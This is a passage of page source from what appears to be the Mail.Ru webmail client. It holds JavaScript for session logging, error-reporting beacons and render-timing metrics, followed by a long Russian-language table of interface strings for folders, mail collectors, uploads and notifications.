			return n > 9 ? n : '0' + n
		}

		var _clearField = function () {
			var MAX_DEPTH = 3;
			var fields = ["Body", "Subject", "body", "subject", "name", "signature"], fieldsMap = {};
			for (var i=fields.length; i--; ) {
				fieldsMap[fields[i]] = null;
			}
			function replace (object, property) {
				var result = object[property];
				if (property in fieldsMap) {
					result = result ? result.length : 0;
				}
				return result;
			}
			return function (object, depth) {
				depth = depth|0;
				if (object && typeof object === "object") {
					var temp = {};
					for (var property in object) {
						if (object.hasOwnProperty(property)) {
							if (typeof object[property] === "object") {
								if ((depth <= MAX_DEPTH) && !(object[property] && object[property].nodeType)) {
									temp[property] = _clearField(object[property], depth + 1);
								}
							} else {
								temp[property] = replace(object, property);
							}
						}
					}
					object = temp;
				}
				return object;
			}
		}();

		return function (type, args, print) {
			if (type === 1) {
				return _logs;
			}
			else if (type === void 0 || type === true) {
				var log = ajs.map(_logs, function (rec) {
					return '[' + rec.ts + '] ' + rec.type + ': ' + JSON.stringify(rec.args);
				}).join('\n');

				if (type !== true) {
					ajs.log(log);
					return;
				}

				return log;
			}

			// MAIL-29924 & MAIL-39711
			args = _clearField(args);

			var
				  ts = new Date
				, n = _logs.push({
						  ts:	pad(ts.getHours()) +':'+ pad(ts.getMinutes()) +':'+ pad(ts.getSeconds())
						, type:	type
						, args:	args
					})
			;

			saveLog();

			if (n > 1000) {
				_logs.shift();
			}

			if (print) {
				window.ajs && ajs.log && ajs.log(type + ':', args);
			}
		};
	})([]);
	patron.log('session.start', { build: patron.build, threads: patron.threads });
	

	patron.saveError = function (type, log){
		if( typeof log !== 'string' ) log = log.join('|');
		(new Image()).src	= '//gstat.imgsmail.ru/gstat?ua=1&clienterror.'+ type +'=1&logme='+ log + '&rnd=' + Math.random();
		if (type == 'js') {
			patron.radar('mailru_JS_error', 1);
		}
	};


	if( /mail\.ru/.test(document.domain) ){
		patron.onError = function (message, url, line){
			patron.log('window.error', arguments, 1);

			if( (url+'').indexOf('/js/') > -1 && (url+'').indexOf('imgsmail') > -1 && line > 1 ){
				patron.saveError('js', [
					  jsVersion +'_'+ jsBuild
					, encodeURIComponent(url)
					, line
					, encodeURIComponent(message)
					, encodeURIComponent(location.toString())
					, 'js1'
				].join('|'));
			} else {
				patron.saveError('js5', [
					  jsVersion +'_'+ jsBuild
					, encodeURIComponent(url)
					, line
					, encodeURIComponent(message)
					, encodeURIComponent(location.toString())
					, 'js5'
				].join('|'));
			}
		};
	}
	else {
		patron.onError = function (){};
	}


	
		window.onerror = function (m, u, l){
			patron.log('onerror', {
				  msg: m
				, url: u
				, line: l
			});

			if( /returnIthis/i.test(m) ){
				ajs.each(window.TemplateService, function (fn, val){
					if( /returnIthis/i.test(fn.toString()) ){
						patron.gstat({ TPL_SERVICE: 1, code: fn.toString() }, 'ua=1');
					}
				});
			}
		
			patron.onError(m, u, l);
			return	true;
		
		};
	

	__log.head__js = 1;

	window.__fest_error = function (msg){
		ajs.log(msg);
		window.onerror(msg, '//imgsmail/js/ru/fest/', 13);
	};



	
		
		
			window.arMailRuFolders = (function (a, t) {
	var u = ajs.Html.unescape;

	function f(x, p) {
		x.parent = (p !== "" && p >= 0 ? p : -1) | 0;
		x.system = (x.parent == -1) && (x.type !== "user") || (x.id == 500006);

		p = a[a.length-1];
		if (p) {
			if (x.type === 'user') {
				x.type = p.type;
			}
		}
		a.push(x);
	}

	

	return a;
})([]);
;
		
	
	__log.folders_data_js = 1;

</script>

<script>__log.letters_data_js = 0;</script>
<script type="text/javascript">
patron.user = {
	collectors: null
};
</script>

<script type="text/javascript">
	__log.letters_data_js = 1;
</script>

<script>__log.search_data_js = 0;</script>
<script type="text/javascript">
	__log.search_data_js = 1;

	patron.FilesSearchData = {
		total: 0
	};

	
	
	
	
	
	
	
	


	patron.CurrentTimestampOffset = Math.round(new Date() / 1000 - patron.CurrentTimestamp);
	__domTS('head__jsf');
</script>

	<!-- needYes radar --><script type="text/javascript">
try {
function timeInterval(bP) {
	if (!rT[bP]) rT[bP] = new Date();
	else {
		rT.i[rT.i.length] = bP + '=' + ( (new Date()).getTime() - rT[bP].getTime() );
		delete rT[bP];
	}
}

var rT = {};
rT.i = [];
timeInterval('renderbrowser');
rT.addHandler = function(object, event, handler, useCapture) {
	if (object.addEventListener) object.addEventListener(event, handler, useCapture ? useCapture : false);
	else if (object.attachEvent) object.attachEvent('on' + event, handler);
};
rT.radar_type = '';
if (window.name.indexOf('srvt') != -1) {
	rT.srvt = ( new Date() ).getTime() - parseInt( window.name.substr(5) );
	window.name = '';
}

if (!window.patron) {
  rT.addHandler(document, 'click', function() {
  	if (!window.name.length || window.name.indexOf('srvt') > -1)
  		window.name = 'srvt=' + (new Date()).getTime();
  });
  rT.addHandler(document, 'keypress', function() {
  	if (window.name.indexOf('srvt') > -1) window.name = '';
  });
}

rT.img0 = new Image();
rT.img0.src = '//mail.radar.imgsmail.ru/update?' +
'p=mail0' +
(rT.radar_type != '' ? ('&t=' + rT.radar_type) : '') +
(rT.srvt ? ('&i=srvt:' + rT.srvt) : '') +
'&v=0&rnd=115803227' +
'';

} catch(e) {}
function timeInterval2(bP) {
    if (!rT[bP]) {
		rT[bP] = new Date();
    } else {
		var rT_cnt = rT.i.length;
		var found  = false;
		for (var j = 0; j < rT_cnt; j++) {
			var rT_array = rT.i[j].split("=");
			if (rT_array[0] == bP) {
				rT.i[j] = bP + '=' + (parseInt(rT_array[1]) + (new Date()).getTime() - rT[bP].getTime() );
				found = true;
			}
		}
		if (!found) {
			rT.i[rT.i.length] = bP + '=' + ( (new Date()).getTime() - rT[bP].getTime() );
		}
		delete rT[bP];
    }
}

</script>


<!-- / needYes radar -->





	<script>includeJS("//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/build/core.js");</script><script type="text/javascript" src="//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/build/core.js"></script>

	<script>require(['jquery'], function ($) { patron.jQuery = $; });</script>
	<script>__log.core_js = window.jsClass && window.patron && patron.toolkit && patron.API;</script>

	<script>__log.lang_js = 0;</script>
<script type="text/javascript">
require(['utils/Lang'], function () {

	Lang.add({ RU: {
		"errors":{
			"timeout": "Произошла ошибка, попробуйте перезагрузить страницу"
		}
	}});

	Lang.add({ RU: {
		"Date": {
			"months":[
				["январь", "февраль", "март", "апрель", "май", "июнь",
				 "июль", "август", "сентябрь", "октябрь", "ноябрь", "декабрь"],
				["января", "февраля", "марта", "апреля", "мая", "июня",
				 "июля", "августа", "сентября", "октября", "ноября", "декабря"],
				["янв", "фев", "мар", "апр", "мая", "июн",
				"июл", "авг", "сен", "окт", "ноя", "дек"]
			],
			"weekdays": ["Пн", "Вт", "Ср", "Чт", "Пт", "Сб", "Вс"],
			"weekdays_full": ["воскресенье", "понедельник", "вторник", "среда", "четверг", "пятница", "суббота"],
			"format": { full: "d n Y в H:I" },
			"today": 'сегодня',
			"yesterday": 'вчера',
			"year": ["год", "года"]
		}

		, 'All-in-all': 'Всего'

		, 'Inbox': 'Входящие'
		, 'ErrorTable': '<table class="or_table w100" cellpadding="0" cellspacing="0"><tr><td class="oranzhe bold">Ошибка</td></tr><tr><td class="oranzhe">%s</td></tr></table>'

		, Title:		{
							  loading:	'Загрузка'
							, sentmsg:	'Написать письмо'
							, sentmsgok:{ sms: 'Сообщение отправлено', reply: 'Ответ отправлен', letter: 'Письмо отправлено' }
						}
		, Messages:		{
							  unread:		['непрочитанных', 'непрочитанное', 'непрочитанных']
							, readed:		['прочитанных', 'прочитанное', 'прочитанных']
							, flagged:		['помеченных флажком', 'помеченное флажком', 'помеченных флажком']
							, attach:		['с файлами', 'с файлами', 'с файлами']
							, 'To.prefix':	'для'
							, 'From.prefix':'от'
							, letter:		['писем', 'письмо', 'письма']
							, noletters:	'Нет писем'
							, addresses:	['адресов', 'адрес', 'адреса']
							, messages:		['сообщений', 'сообщение', 'сообщения']
							, contacts_abook:		['Контакты добавлены', 'Контакт добавлен', 'Контакты добавлены']
							, mailru_news:	'Новости Почты Mail.Ru'

							, TopUnread:	'Новых&nbsp;писем:'
							, TopNoUnread:	'У Вас нет новых писем'

							, Actions:		{
												  mark:		'Помечено %s'
												, move:		'%s перемещено в папку &laquo;%s&raquo;'
												, move2Trash:'%s перемещено в Корзину'
												, spam:		'%s перемещено в папку &laquo;%s&raquo;'
												, unsubscribe:'Вы отписаны от рассылки'
												, remove:	'Удалено %s'
												, abook:	'%s в адресную книгу'
												, empty:	'Необходимо отметить письма'
												, moving:	['перемещено', 'перемещено', 'перемещены']
												, superNoSpam: 'Жалоба отправлена разработчикам. Спасибо за вашу помощь!'
											}
							, ActionsTread:	{
												  mark:		'Письма помечены'
												, move:		'Письма перемещены в папку &laquo;%s&raquo;'
												, move2Trash:'Письма перемещены в Корзину'
												, spam:		'Письма перемещены в папку &laquo;%s&raquo;'
												, unsubscribe:'Вы отписаны от рассылки'
												, remove:	'Письма удалены'
												, abook:	'%s в адресную книгу'
												, empty:	'Необходимо отметить письма'
												, moving:	['перемещено', 'перемещено', 'перемещены']
												, superNoSpam: 'Жалоба отправлена разработчикам. Спасибо за вашу помощь!'
											}
							, priority:		{ 1: 'высокий', 3: 'обычный', 5: 'низкий' }
						}

		, Message:		{
							  unread:		'Непрочитанное'
							, replied:		' отвечено'
							, forwarded:	' переслано'
							, important:	' Важное'
							, high_priority:'Высокая важность '
							, low_priority:	'Низкая важность '
							, priority:		{
								  high:		'Важность письма: высокая'
								, low:		'Важность письма: низкая'
								, normal:	'Важность письма: обычная'
								}
						}

		, MessagesSelectAllTitle:	['Выделить все', 'Снять выбор']
		, MessagesCheckBoxTitle:	['выбрать', 'снять выбор']
		, MessagesFlags:			['пометить флажком', 'снять флажок']
		, MessagesMarkUnread:		'Пометить непрочитанным'
		, InternalError:			'Ошибка сервера, обновите страницу.'
		, 'timeout.error':			'Нет подключения. Проверьте соединение с интернетом'
		, 'connection.error':		'Нет подключения. Проверьте соединение с интернетом'
		, MessageNotFound:			'Требуемое письмо на сервере отсутствует.'
		, FileSearchDownloadSizeLimit:	'Слишком большой размер файлов. Скачивать за один раз можно не более %s МБ'
		, FileSearchForwardSizeLimit:	'Слишком большой размер файлов. Пересылать за один раз можно не более %s МБ'

		, 'forward.fail.limit': 'Максимальное количесво писем в цепочках не должно привышать %d.'
		, 'forward.fail.access': 'В цепочках есть письма из запороленых папок.'

		, Files:		{
							  file:		['файлов', 'файл', 'файла']
							, Title: 'Файлы'
							, Actions:		{
												  fileInArchive:	['скрыто', 'скрыт', 'скрыто']
												, fileFromArchive:	['перемещено из скрытых', 'перемещен из скрытых', 'перемещено из скрытых']
											}
						}

		, Loading: { messages: 'Загрузка' }

		, IsSpam:		'Это спам'
		, IsNotSpam:	'Не спам'
		, ListSubscribe:	'Подписаться'

		, Pager:	{
						  infoTop:		'%s-%s из %s'
						, infoBottom:	'Показаны письма&nbsp;%s-%s из %s'
						, next:			'Далее'
						, prev:			'Назад'
					}

		, Size:		{
						  bytes:		'байт'
						, bytesPl:	'байтa'
						, kb:			'КБ'
						, mb:			'МБ'
						, gb:			'ГБ'
					}

		, 'create.folder': 'Создать новую папку'
		, 'dropdown.more.empty':	'Отметьте&nbsp;галочками&nbsp;нужные&nbsp;письма'
		, 'addressee': ['адресатов', 'адресат', 'адресата']
		, 'addressee.and.more': ' и&nbsp;еще %n&nbsp;%s'

		, 'dropdown.moveto': 'Переместить '
		, 'dropdown.select-messages.To.prefix': 'Все письма для '
		, 'dropdown.select-messages.To.disabled': 'Все письма для…'

		, 'dropdown.select-messages.From.prefix': 'Все письма от '
		, 'dropdown.select-messages.From.disabled': 'Все письма от…'

		, 'message.email.untitled':	'Без темы'
		, 'message.email.unknown':	'Неизвестно'

		, 'files.plural':	['файлов', 'файл', 'файла']
		, 'upload.over': 'Вы можете присоединить к письму не более %s. Будут загружены первые %s из выбранных.'
		, 'upload.overonefile': 'Вы можете присоединить к письму не более %s. Будет загружен первый файл из выбранных.'
		, 'upload.limit': 'Вы можете присоединить к письму не более %s файлов.'
		, 'upload.limit.template': 'Общий размер вложенных в письмо файлов превышает 25 МБ. К сожалению, не удалось прикрепить к письму: %s'
		, 'upload.limit.template_more': 'и еще %s файлов.'
		, 'upload.error.upload': 'Не удалось загрузить файл %s'
		, 'upload.error.remove': 'Не удалось удалить файл %s'
		, 'upload.error.files': 'Не удалось загрузить файл %s'
		, 'upload.error.reattach': 'Не удалось прикрепить файлы'
		, 'upload.error.fileempty': 'Файл %s пустой и не может быть загружен'
		, 'upload.error.cloudupload': 'Не удалось прикрепить файлы из Облака: %s'
		, 'upload.error.toobig': 'Не удалось загрузить файл %s'
		, 'upload.error.disabledfiletype': 'Файл %s заблокирован в целях безопасности. <a target=\"_blank\" href=\"//help.mail.ru/mail-help/attachments/disabled_files\">Справка</a>'
		, 'upload.info.files': 'Файлы, помеченные этим значком, превышают размер вложения %s МБ и будут отправлены как ссылки. Ссылки на них появятся автоматически.'
		, 'upload.info.cloud': 'Файлы, помеченные этим значком, превышают размер вложения %s МБ и будут отправлены как ссылки. Получатель сможет скачать файлы с проекта Облако Mail.Ru. Ссылки на них появятся автоматически.'
		, 'upload.info.mixed': 'Файлы, помеченные этим значком, превышают размер вложения %s МБ и будут отправлены как ссылки.<br>Ссылки на них появятся автоматически.'

		, 'confirm.folder.clear':	'Очистить папку «%s»?'
		, 'confirm.disable_notifications': 'Отключение уведомлений снижает уровень безопасности вашего почтового ящика. Продолжить?'

		, 'folders.names': { spam: 'Спам', move: 'Папка' }
		, 'folder.clear.confirm': {
			def:	'Вы действительно хотите удалить все письма из %s?',
			bulk:	'Вы действительно хотите удалить все письма из папки \"%s\" без возможности восстановления?',
			mrim:	'Вы действительно хотите удалить все письма из папки \"%s\" без возможности восстановления?'
		}

		, 'folders.more': {
			  up:   'Свернуть'
			, down: 'Еще'
		  }

		, 'folder.name.0': 'Входящие'
		, 'folder.name.950': 'Спам'
		, 'folder.name.500000': 'Отправленные'
		, 'folder.name.500001': 'Черновики'
		, 'folder.name.500002': 'Корзина'
		, 'folder.name.600006': 'Все непрочитанные письма'
		, 'folder.name.600007': 'Все отмеченные флажком'
		, 'folder.name.600008': 'Все с вложениями'

		, 'feature:tester': 'Бета-тестер'
		, 'feature:alias': 'Временные адреса'
		, 'feature.desc:alias': 'Временный адрес - это адрес электронной почты, который можно использовать при регистрации на сомнительных сайтах или в публичных целях. Все письма, отправленные на этот адрес, будут доставлены в ваш основной ящик, но адрес основного ящика будет скрыт от отправителя.'
		, 'feature:betaFeedback': 'Бета-тестирование'
		, 'feature:threads': 'Группировать письма'
		, 'feature.desc:threads': 'Сообщения группируются в виде последовательности («ветви»), если их объединяет общая тема'

		, 'feature:compose.use_api_v1': 'Новое написание письма'
		, 'feature.desc:compose.use_api_v1': 'Мы переписали код, который отвечает за отправку писем. Теперь написание и ответ на письмо работает быстрее'

		, 'feature:compose.drop_image_in_editor': 'Вставка картинок в тело письма'
		, 'feature.desc:compose.drop_image_in_editor': 'Теперь вы можете перетаскивать картинки на форму написания письма, и они будут вставлены в тело письма'
		, 'feature:feedback': 'Что делал:\\n\\nВ чем ошибка:\\n\\nКак должно было работать:'
		, 'feature:detailLink': 'Подробнее'
		, 'notify.load': 'Загрузка'
		, 'notify.send': 'Отправка'
		, 'notify.move': 'Перемещение'
		, 'notify.undo': 'Отменить'
		, 'notify.undo.done': 'Действие отменено'
		, 'notify.createfilter': 'Перемещать автоматически'
		, 'notify.error': 'Ошибка сервера'
		, 'notify.error.nomsg': 'Требуемое письмо на сервере отсутствует'
		, 'notify.error.render': 'Ошибка отображения'
		, 'notify.load.still': 'Все еще идет загрузка'
		, 'notify.send.still': 'Все еще идет отправка'
		, 'notify.move.still': 'Все еще идет перемещение'
		, 'notify.connection.hello': 'Сеть, к которой вы подключены, запрашивает дополнительную информацию &mdash; <a target=\"_blank\" href=\"//mail.ru/\">посмотреть</a>!'
		, 'notify.connection.error': 'Нет соединения с интернетом'
		, 'notify.connection.still.error': 'Нет соединения с интернетом'
		, 'notify.save': 'Изменения сохранены'
		, 'notify.send.error': 'Ошибка отправки, попробуйте ещё раз через пару секунд'
		, 'notify.send.invalid_address': 'Недопустимый адрес<br />Адрес %email не существует или заблокирован. Письмо не было послано. Исправьте ошибку и отправьте письмо еще раз.'
		, 'notify.send.invalid_addresses': 'Недопустимые адреса<br />Следующие адреса: %emails не существуют или заблокированы. Письмо не было послано. Исправьте ошибку и отправьте письмо еще раз.'
		, 'notify.send.over_limit': 'Слишком много адресатов<br />Превышено максимальное количество адресатов письма. Допустимо до %limit адресатов (в сумме в полях Кому, Копия и Скрытая).'
		, 'notify.letter.sent': 'Письмо отправлено'
		, 'notify.attachToCloud.description': 'Выберите папку, в которую вы хотите сохранить файл <span class=\"js-filename\" style=\"display:inline-block; white-space: nowrap;max-width:120px\">%s</span>.'
		, 'notify.attachToCloud.description_mass': 'Выберите папку, в которую вы хотите сохранить %s %s.'
		, 'notify.attachToCloud.complete': 'Файл <span class=\"js-filename\" style=\"display:inline-block; white-space: nowrap;max-width:120px\">%s</span> сохранен в Облако'
		, 'notify.attachToCloud.complete_mass.plural': ['%s файлов сохранено в Облако', '%s файл сохранен в Облако', '%s файла сохранено в Облако']
		, 'notify.attachToCloud.error': 'Не удалось сохранить файл <span class=\"js-filename\" style=\"display:inline-block; white-space: nowrap;max-width:120px\">%s</span> в Облако'
		, 'notify.attachToCloud.error_mass': 'Не удалось сохранить файлы в Облако'

		, 'notify.collector.remove.ok': 'Сборщик %s успешно удален'

		, 'notify.collector.remove.error': 'Не получилось удалить указанный сборщик'

		, 'notify.collector.state.ok': 'Состояние сборщика %s успешно изменено'

		, 'notify.collector.state.error': 'Не получилось изменить состояние указанного сборщика'

		, 'notify.filters.add.over_limit': 'Превышен допустимый лимит фильтров'

		, 'notify.collector.noauth.ok': 'Сбор почты с %s возобновится через несколько минут'

		, 'notify.collector.add.ok': 'Сборщик %s успешно добавлен'
		, 'notify.collector.folder.ok': 'Настройки для ящика %s успешно сохранены'

		, 'notify.folder.delete': 'Папка удалена'
		, 'notify.folder.add': 'Папка создана'
		, 'notify.folder.edit': 'Изменения сохранены'
		, 'notify.folder.clear': 'Папка очищена'

		, 'notify.collector.noauth': 'Сбор писем с <nobr>%email</nobr> не производится с %date.<br />Обновите пароль, чтобы возобновить сбор писем.'

		, 'notify.collector.need_activation_by_user': 'Введите пароль от ящика <nobr>%email</nobr>, расположенного на старом сервере, чтобы собирать все письма с него в текущий ящик.'

		, 'notify.collector.extra_auth': 'Сбор писем с <nobr>%email</nobr> не производится с %date.<br />Обновите пароль, чтобы возобновить сбор писем.'

		, 'notify.social.connect_success': 'Социальная сеть {0} <a href=\"/settings/social\">подключена</a> успешно!'
		, 'notify.social.connect_error': 'Социальную сеть {0} <a href=\"/settings/social\">подключить</a> не удалось!'

		, 'notify.collector.extra_auth.unknown_last_update': 'Сбор писем с <nobr>%email</nobr> не производится.<br />Обновите пароль, чтобы возобновить сбор писем.'

		, 'notify.collector.extra_auth.oauth': 'Сбор писем с <nobr>%email</nobr> не производится с %date.<br />Для возобновления сбора почты, подтвердите доступ к ящику <nobr>%email</nobr>.'

		, 'notify.collector.extra_auth.oauth.unknown_last_update': 'Сбор писем с <nobr>%email</nobr> не производится.<br />Для возобновления сбора почты, подтвердите доступ к ящику <nobr>%email</nobr>.'

		, 'collector.remove.title': 'Вы действительно хотите удалить сборщик почты?'

		, 'collector.remove.text': 'Если вы хотите временно отключить сборку, то лучше нажмите на кнопку &laquo;Выключить&raquo;'

		, 'collector.remove.btn': 'Удалить'

		, Collector: {
			edit: {
				  title: 'Редактирование сборщика'

				, desc: 'Сбор почты не производится. Пароль устарел или был вами изменен. <br /> Восстановите сбор почты, указав действующий пароль от'

				, info: {
					  fail: '<p>Во время соединения с сервером произошла ошибка.<br />В данный момент сбор почты отключен, но он возобновится в ближайшее время.</p><p>Мы работаем над решением проблемы.</p>'
					, complete: 'Сбор почты возобновится через несколько минут'
				  }
				, error: {
					  'invalid': 'Соединение с сервером прошло успешно, но авторизоваться не удалось. <br />Проверьте правильность имени ящика и пароля.'
					, 'invalid_oauth': 'Соединение с сервером прошло успешно, но авторизоваться не удалось. <br />Проверьте правильность введенных данных.'
					, 'conflict': 'Не удалось подключиться к почтовому серверу.<br />Проверьте в настройках своего почтового провайдера, разрешен ли сбор почты по протоколу IMAP.'
					, 'auth': 'Соединение с сервером прошло успешно, но авторизоваться не удалось.'
					, 'domain': 'Некорректно заполнено поле «Имя ящика».'
					, 'over_limit': 'Достигнуто максимальное количество сборщиков почты для одного аккаунта.'
					, 'required': 'Проверьте правильность заполения всех полей.'
					, 'exists': 'Соединение с сервером прошло успешно, но указанный ящик уже используется.'
					, 'unsupported': 'Не удалось установить соединение, попробуйте повторить попытку позже.'
					, 'extended': 'Не удалось установить соединение. Введите настройки почтового сервера для %email.'
					, 'internal': 'Произошла внутренняя ошибка, попробуйте повторить попытку позже.'
					, 'password': 'Поле «Пароль» должно быть заполнено.'
					, 'email': 'Поле «Имя ящика» должно быть заполнено.'
					, 'loading': 'Пожалуйста подождите.'
					, 'system': 'Произошла непредвиденная ошибка, попробуйте повторить попытку позже.'
					, 'auth_limit': 'Превышено допустимое количество попыток авторизации с сервером. Попробуйте повторить запрос позднее.'
					, 'expectation_failed': 'Не удалось выполнить указанное действие. Попробуйте повторить запрос позднее.'
					, 'not_found': 'Что-то пошло не так. Попробуйте повторить запрос позднее.'
					, 'denied': 'Выполнение данной операции невозможно.'
					, 'timeout': 'Превышено максимальное время на выполнение запроса. Попробуйте повторить запрос позднее.'
					, 'token': 'Соединение с сервером прошло успешно, но авторизоваться не удалось.'
					, 'oneself': 'Вы не можете собирать письма с текущего почтового ящика. <br />Пожалуйста, укажите имя другого ящика'
					, 'captcha': 'Некорректно заполнено поле «Код».'
					, 'port': 'Неверно указан порт исходящей почты.'
					, 'server': 'Неверно указан сервер исходящей почты.'
					, 'ssl': 'Не получилось установить SSL-соединение.'
					, 'folder': 'Пожалуйста выберите другую папку для сбора списем.'
					, 'import': 'Не получилось выполнить импортирование писем. Попробуйте повторить запрос позднее.'
					, 'addressbook': 'Не получилается импортировать адресную книгу.'
					, 'apply_filters': 'Не удается применять к полученным письмам фильтры.'
					, 'mark': 'Не удается пометить все старые письма как прочитанные.'
					, 'keep_original': 'Произошла непредвиденная ошибка, попробуйте повторить попытку позже.'
					, 'badkey': 'Произошла непредвиденная ошибка, попробуйте повторить попытку позже.'
					, 'folder_name': 'Имя папки не должно превышать 250 символа или совпадать с системными названиями папок.'
					, 'user_name': 'Неверно указано имя пользователя.'
					, 'not_exists': 'Вы пытаетесь отредактировать несуществующий сборщик.'
					, 'incoming': 'Не удалось подключиться к серверу входящей почты. Пожалуйста проверьте настройки и попробуйте снова.'
				}

				, inbox : 'Входящие'
				, folder: 'В какую папку сохранять входящие письма?'

				, 'incoming': 'Сервер входящей почты'
				, 'outgoing': 'Сервер исходящей почты'

				,  types: {
					imap:     'IMAP',
					pop3:     'POP3',
					exchange: 'Exchange'
				}

				, fields: {
					  password : 'Пароль'
					, email    : 'E-mail'
					, user_name: 'Логин'
					, server   : 'Сервер'
					, port     : 'Порт'
					, apply_filters: 'Применять фильтры к полученным письмам'
					, mark: 'Пометить все письма как прочитанные'
				}

				, options: {
					  imap: 'Использовать преимущества IMAP'
					, data: '<b>Структура папок</b> будет импортирована'
					, name: 'Станет доступен <b>выбор отправителя</b> <br />при написании письма'
				}

				, controls: {
					  close: 'Закрыть'
					, save: 'Готово'
					, skip: 'Продолжить'
					, loading: 'Идет проверка данных'
					, recovery: 'Восстановить сбор почты'
				}
			},

			edit_need_activation: {
				  desc: 'Сбор почты не производится. Указав пароль от старого сервера,  <br /> настройте сбор писем со старого ящика'

				, controls: {
					recovery: 'Запустить сбор почты'
				}
			},

			convert: {
				title: 'Настройка сбора почты c ящика'
			},

			tutorial: {
				  title: 'Добро пожаловать в Почту Mail.Ru!'
				, desc: 'У вас есть почтовый ящик на одном из этих сервисов?<br />Тогда рекомендуем вам собрать все письма из него в почтовый ящик'
			},

			singleStep : {
				title: 'Подключение почтовых ящиков'
			},

			update_token: {
				  title: 'Восстановление сбора почты'
				, desc: 'Для возобновления сбора почты требуется восстановить доступ к аккаунту'

				, controls: {
					recovery: 'Восстановить доступ к аккаунту'
				}
			},

			add: {
				  success: 'Сборщик добавлен успешно. Сбор почты начнется в течение 15 минут.'
				, 'title': 'Добавить почтовый ящик'

				, 'desc': 'У вас есть почтовый ящик на одном из этих сервисов? <br />Тогда рекомендуем вам собрать все письма из него в почтовый ящик'

				, text: {
					  'gmail.com': 'Для авторизации через Google OAuth вам не нужно вводить пароль, а достаточно предоставить доступ к вашему аккаунту Gmail.'
					, 'other': 'Другие'
				}

				, controls: {
					  'loading': 'Идет проверка данных'
					, 'add'    : 'Добавить ящик'
					, 'skip'   : 'Пропустить'
					, 'cancel'   : 'Отменить'
				}

				, fields: {
					  login   : 'Имя ящика'
					, password: 'Пароль'
					, pop3    : 'Использовать протокол POP3'
				}

				, submit: {
					'default': 'Войти в почту'
				}
			},

			oauth: {
				text: {
					description: 'Для авторизации в %host вам не нужно вводить пароль, а достаточно предоставить доступ к вашему аккаунту через %service.'
				},
				services: {
					  'gmail.com'  : 'Google OAuth'
					, 'outlook.com': 'Live connect'
					, 'yandex.ru'  : 'Yandex OAuth'
				}
			},

			edit_folder: {
				title: 'Сборщик успешно добавлен!',
				desc: 'Сейчас мы перенесем вашу почту',
				warn: '(Это может занять несколько часов)',
				folder: 'В какую папку сохранять входящие письма?',
				inbox: 'Входящие',
				controls: {
					save: 'Сохранить'
				},
				fields: {
					apply_filters: 'Применять фильтры к полученным письмам',
					mark: 'Пометить все письма как прочитанные'
				},

				experiment: {
					1: {
						title: 'Сбор почты восстановлен',

						desc: 'Сбор почты восстановлен по протоколу POP3, т.к. не удалось подключиться к IMAP серверу.<br /><br />Копирование писем из ящика <nobr>%email</nobr> может занять несколько часов.'
					}
				}
			},

			set_folder: {
				title: 'Пароль для сбора почты обновлен!',
				desc: 'Отлично! Сейчас мы перенесем вашу почту',
				warn: '(Это может занять несколько часов)',
				folder: 'В какую папку сохранять входящие письма?',
				inbox: 'Входящие',
				controls: {
					save: 'Сохранить'
				},
				fields: {
					apply_filters: 'Применять фильтры к полученным письмам',
					mark: 'Пометить все письма как прочитанные'
				}
			}
		}

		, 'password.wrong': 'Неверный пароль, попробуйте еще раз'
		, 'lightbox.wait': 'Секунду…'
		, 'project.system_error': 'Ошибка сервера, попробуйте еще раз'
		, 'dragndrop.drop_to_page': 'Перетащите файлы в любое место на странице'

		/* < titles */
		, 'title.default': '#email# - Почта Mail.Ru'

		, 'title.msglist': '#folder# - #email# - Почта Mail.Ru'
		, 'title.msglist.unread': '(#unread#) #folder# - #email# - Почта Mail.Ru'
		, 'title.messages': '#folder# - #email# - Почта Mail.Ru'
		, 'title.messages.unread': '(#unread#) #folder# - #email# - Почта Mail.Ru'

		, 'title.readmsg': '#subject# - #email# - Почта Mail.Ru'
		, 'title.message': '#subject# - #email# - Почта Mail.Ru'
		, 'title.thread':  '#subject# - #email# - Почта Mail.Ru'

		, 'title.sentmsg': 'Новое письмо - #email# - Почта Mail.Ru'
		, 'title.sentmsg.reply': 'Ответ - #subject# - #email# - Почта Mail.Ru'
		, 'title.sendmsgok': 'Письмо отправлено - #email# - Почта Mail.Ru'
		, 'title.sendmsgok.reply': 'Ответ - #subject# - #email# - Почта Mail.Ru'
		, 'title.msglist': '#folder# - #email# - Почта Mail.Ru'
		, 'title.msglist.unread': '(#unread#) #folder# - #email# - Почта Mail.Ru'
		, 'title.msglist.unread_without_counter': '#folder# - #email# - Почта Mail.Ru'
		, 'title.readmsg': '#subject# - #email# - Почта Mail.Ru'
		, 'title.ajax_attach_action': '#name# - #subject# - #email# - Почта Mail.Ru'
		, 'title.attachment': '#filename# - #subject# - #email# - Почта Mail.Ru'
		, 'title.gosearch': 'Поиск - #email# - Почта Mail.Ru'
		, 'title.gosearch.query': 'Поиск - #query# - #email# - Почта Mail.Ru'
		, 'title.filesearch': 'Файлы - #email# - Почта Mail.Ru'
		, 'attachViewer.paging.from': 'из'
		, 'title.contacts': '#name# - Контакты - #email# - Почта Mail.Ru'
		/* titles > */

		, 'unread.plural': ['новых', 'новое', 'новых']
		, 'jinn.new_messages': 'Вам %s'
		, 'jinn.from': 'от:'
		, 'readmsg.blockquote.ctrl': ['Развернуть цитирование', 'Свернуть цитирование']
		, 'readmsg.quote.show': 'Развернуть цитирование'
		, 'readmsg.phone.highlight': ['Позвонить через Веб-Агент']
		, 'mail': 'Почта'
		, 'cloud': 'Облако'
		, 'multiAttachHeaders': ['Файлы', 'Файлы из Облака', 'Файлы из Почты', 'Файлы из Облака и Почты']
		, 'folders.toggler.ctrl': ['Ещё', 'Свернуть']

		, 'thread.reply': "Письмо отправлено. Вернуться к <a href=\"/thread/:id/\" rel=\"history\" class=\"message-sent__title__link\">переписке</a>."
		, 'thread.not-found': "Требуемое письмо на сервере отсутствует."
		, 'letter.inline_image_wrapper_link_text': "открыть в новой вкладке"
	}});

	Lang.add({'RU': {
		'delete_phone_error.NO_AUTH': 'Текущий пароль не указан или указан не верно',
		'delete_phone_error.EMPTY_ADDITIONAL_EMAIL': 'Пожалуйста, укажите дополнительный адрес элекронной почты',
		'delete_phone_error.EMPTY_QUESTION': 'Пожалуйста, укажите секретный вопрос',
		'delete_phone_error.EMPTY_ANSWER': 'Пожалуйста, укажите ответ на секретный вопрос',
		'delete_phone_error.HACKER': 'К сожалению, ваш IP заблокирован. Пожалуйста, обратитесь к администратору вашей сети',
		'delete_phone_error.DEFAULT': 'Ошибка сервера. Повторите операцию',
